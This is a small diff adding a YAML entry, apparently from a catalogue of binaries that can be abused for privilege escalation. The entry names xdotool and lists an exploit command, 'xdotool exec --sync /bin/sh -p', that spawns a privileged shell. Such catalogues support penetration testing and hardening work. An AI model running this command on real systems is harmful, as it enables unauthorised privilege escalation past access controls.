@@ -1,0 +1,4 @@
+name: xdotool
+binary_path: /usr/bin/xdotool
+exploit_cmds:
+- /usr/bin/xdotool exec --sync /bin/sh -p
